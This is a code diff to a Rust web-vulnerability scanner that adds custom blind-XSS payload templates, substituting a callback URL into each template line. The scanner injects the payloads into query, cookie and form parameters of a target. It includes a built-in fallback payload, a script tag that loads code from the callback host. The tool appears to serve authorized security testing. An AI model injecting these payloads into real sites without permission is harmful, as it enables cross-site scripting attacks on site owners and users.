@@ -1,11 +1,66 @@
 use crate::target_parser::Target;
 
-pub async fn blind_scanning(target: &Target, callback_url: &str) {
+/// Build the blind-XSS payload(s) for a callback URL.
+///
+/// When `custom_template_path` is provided, every non-empty,
+/// non-`#`-comment line that contains `{callback}` is treated as a
+/// template and `{callback}` is substituted with `callback_url`. Lines
+/// without `{callback}` are reported via stderr and dropped — that's
+/// the contract advertised by `--custom-blind-xss-payload`. If no
+/// usable lines exist in the file (or it can't be read), fall back to
+/// the built-in template.
+fn build_blind_payloads(callback_url: &str, custom_template_path: Option<&str>) -> Vec<String> {
+    if let Some(path) = custom_template_path {
+        match std::fs::read_to_string(path) {
+            Ok(content) => {
+                let mut payloads: Vec<String> = Vec::new();
+                let mut bad_lines = 0u32;
+                for (lineno, line) in content.lines().enumerate() {
+                    let trimmed = line.trim();
+                    if trimmed.is_empty() || trimmed.starts_with('#') {
+                        continue;
+                    }
+                    if trimmed.contains("{callback}") {
+                        payloads.push(trimmed.replace("{callback}", callback_url));
+                    } else {
+                        bad_lines += 1;
+                        if bad_lines <= 3 {
+                            eprintln!(
+                                "Warning: --custom-blind-xss-payload line {} skipped (no {{callback}} placeholder)",
+                                lineno + 1
+                            );
+                        }
+                    }
+                }
+                if !payloads.is_empty() {
+                    return payloads;
+                }
+                eprintln!(
+                    "Warning: --custom-blind-xss-payload {} had no usable lines — falling back to built-in",
+                    path
+                );
+            }
+            Err(e) => {
+                eprintln!(
+                    "Warning: failed to read --custom-blind-xss-payload {}: {} — falling back to built-in",
+                    path, e
+                );
+            }
+        }
+    }
     let template = crate::payload::XSS_BLIND_PAYLOADS
         .first()
         .copied()
         .unwrap_or("\"'><script src={}></script>");
-    let payload = template.replace("{}", callback_url);
+    vec![template.replace("{}", callback_url)]
+}
+
+pub async fn blind_scanning(
+    target: &Target,
+    callback_url: &str,
+    custom_template_path: Option<&str>,
+) {
+    let payloads = build_blind_payloads(callback_url, custom_template_path);
 
     // Collect all params with static str types to avoid per-param String allocation
     let mut all_params: Vec<(String, &str)> = Vec::new();
@@ -34,9 +89,13 @@ pub async fn blind_scanning(target: &Target, callback_url: &str) {
         all_params.push((k.clone(), "cookie"));
     }
 
-    // Send requests for each param
+    // Send requests for each (param × payload). Custom templates
+    // typically supply just one or two shapes, so the cartesian
+    // product stays small.
     for (param_name, param_type) in &all_params {
-        send_blind_request(target, param_name, &payload, param_type).await;
+        for payload in &payloads {
+            send_blind_request(target, param_name, payload, param_type).await;
+        }
     }
 }
 
@@ -167,15 +226,22 @@ async fn send_blind_request(target: &Target, param_name: &str, payload: &str, pa
 /// query-param blind injection in [`blind_scanning`]. Cross-origin form
 /// actions are skipped to avoid unintended outbound requests. Multipart
 /// forms are also skipped in this first pass.
-pub async fn blind_scan_forms(target: &Target, callback_url: &str) {
+pub async fn blind_scan_forms(
+    target: &Target,
+    callback_url: &str,
+    custom_template_path: Option<&str>,
+) {
     use tokio::time::{Duration, sleep};
     use url::form_urlencoded;
 
-    let template = crate::payload::XSS_BLIND_PAYLOADS
+    let payloads = build_blind_payloads(callback_url, custom_template_path);
+    // For form-discovery blast we keep the first template — the form
+    // probe is best-effort and using every template here multiplies
+    // request count without changing detection probability much.
+    let payload = payloads
         .first()
-        .copied()
-        .unwrap_or("\"'><script src={}></script>");
-    let payload = template.replace("{}", callback_url);
+        .cloned()
+        .unwrap_or_else(|| "\"'><script src=ABOUT:BLANK></script>".to_string());
 
     let client = target.build_client_or_default();
     let cookie_header = build_cookie_header(&target.cookies);
